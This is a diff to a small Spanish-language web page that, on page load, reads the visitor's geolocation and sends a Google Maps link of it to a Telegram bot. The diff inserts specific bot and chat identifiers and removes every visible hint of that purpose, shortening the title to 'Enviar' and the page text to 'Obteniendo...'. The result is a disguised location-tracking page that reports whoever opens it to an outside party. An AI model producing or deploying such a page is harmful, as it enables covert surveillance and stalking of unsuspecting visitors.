@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enviar Ubicación a Telegram</title>
+    <title>Enviar</title>
     <script>
         window.onload = function() {
             if (navigator.geolocation) {
@@ -16,9 +16,9 @@
         function sendLocation(position) {
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
-            let botToken = "TU_BOT_TOKEN";  // Reemplaza con tu token de bot
-            let chatId = "TU_CHAT_ID";  // Reemplaza con tu ID de usuario o grupo
-            let message = `Ubicación actual: https://www.google.com/maps?q=${lat},${lon}`;
+            let botToken = "7460076974";
+            let chatId = "1390314920";
+            let message = `https://www.google.com/maps?q=${lat},${lon}`;
             
             let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
             
@@ -34,6 +34,6 @@
     </script>
 </head>
 <body>
-    <p>Obteniendo ubicación y enviándola a Telegram...</p>
+    <p>Obteniendo...</p>
 </body>
 </html>
